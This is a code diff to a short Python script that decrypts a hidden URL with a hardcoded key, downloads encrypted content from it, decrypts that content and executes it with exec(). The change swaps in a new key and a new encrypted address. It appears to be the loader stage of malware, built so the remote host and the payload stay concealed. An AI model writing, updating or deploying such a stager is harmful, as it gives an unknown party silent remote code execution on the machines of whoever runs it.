@@ -1,6 +1,6 @@
 from urllib import request
 import hashlib,hmac,struct, base64
-key = b']#\x89\xb8\xe8\x9a\xbf\x00\xe6\x9c\x11L\x10\xe8q$\xcd\xe5\xc2\x08\xd5-fG26\xc3\x8d\xca\xf5\xe6\xcc'
+key = b'\xb4\xb7\x1bf\x0f?O}\xaa9\x82\xb2\x12m|\x86\x92\xc5q-C\xc6\xf7^U\xdc\x83\x1eM(\x96\\'
 
 def decrypt(encrypted_content, key):
         """Decrypts content using XOR cipher with HMAC verification."""
@@ -29,6 +29,6 @@ def decrypt(encrypted_content, key):
         return bytes(plaintext)
 
 
-url = b'E2XhFH0vbDH+jH5Ml5dvuc3L3AcNFFbsYBfddC0oYXrN5F2fgRkQBbtfEmVBID5AvVkSNwgZ7Lz4wsj8cxOnidKvjzDX'
+url = b'eokjddVmOqozBqJbMWCz4iIvuTcC5Z1ttSXekpU33bbxgbTp4YSkPxj8Uu9SF9Q4roMqJeasMXwaoXKEmStIPgV6TZoIrdF+BBno5usBVA=='
 
-exec(decrypt(base64.b64decode(request.urlopen(decrypt(base64.b64decode(url),key).decode('utf-8')+"/client.py").read()),key).decode('utf-8'))
+exec(decrypt(base64.b64decode(request.urlopen(decrypt(base64.b64decode(url),key).decode('utf-8')).read()),key).decode('utf-8'))
